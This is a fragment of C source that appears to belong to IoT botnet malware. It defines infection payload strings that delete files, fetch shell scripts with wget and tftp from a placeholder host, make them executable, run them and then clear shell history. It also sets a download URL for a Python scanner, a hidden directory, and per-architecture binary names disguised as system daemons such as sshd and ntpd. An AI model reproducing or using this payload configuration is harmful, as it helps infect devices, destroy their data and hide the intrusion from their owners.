...
char *Busybox_Payload = "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/ || /var/run/ || /var/system/ || /mnt/ || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox wget 127.0.0.1/bins.sh;chmod 777;sh bins.sh;busybox tftp -g 127.0.0.1 -r tftp1.sh;chmod 777 *;sh tftp1.sh;busybox tftp -g 127.0.0.1 -r tftp2.sh;chmod 777 *;sh tftp2.sh;rm -rf *sh;history -c;history -w;rm -rf ~/.bash_history;cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/ || /var/run/ || /var/system/ || /mnt/ || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox wget 127.0.0.1/bins.sh;chmod 777;sh bins.sh;busybox tftp -g 127.0.0.1 -r tftp1.sh;chmod 777 *;sh tftp1.sh;busybox tftp -g 127.0.0.1 -r tftp2.sh;chmod 777 *;sh tftp2.sh;rm -rf *sh;history -c;history -w;rm -rf ~/.bash_history"; //Telnet Scanner Must implement Busybox.
char *Payload = "cd /tmp/;wget http://127.0.0.1/bins.sh;sh bins.sh;rm -rf bins.sh;cd /tmp/;wget http://127.0.0.1/bins.sh;sh bins.sh;rm -rf bins.sh"; //Normal Payload Without busybox Implemented.

char *Python_Temp_Directory = "/etc/.../"; //Temp directory The Python Scanner is Downloaded to and executed from.
char *Python_File_Location = "http://127.0.0.1/scan.py"; //Payload To Download The Python Scanner.

char *BINS_HOST_IP = "127.0.0.1";
char *BIN = "bins.sh";
char *TFTP1 = "tftp1.sh";
char *TFTP2 = "tftp2.sh";
char *FTP1 = "ftp1.sh";

char *BINS1 = "ntpd"; //MIPS
char *BINS2 = "sshd"; //MIPSEL
char *BINS3 = "openssh"; //SH4
char *BINS4 = "bash"; //X86_64
char *BINS5 = "tftp"; //ARMV6L
char *BINS6 = "wget"; //I686
char *BINS7 = "cron"; //POWERPC
char *BINS8 = "ftp"; //I586
char *BINS9 = "pftp"; //M68K
char *BINS10 = "sh"; //SPARC
char *BINS11 = "' '"; //ARMV4L
char *BINS12 = "apache2"; //ARMV5L
char *BINS13 = "telnetd"; //POWERPC440FP
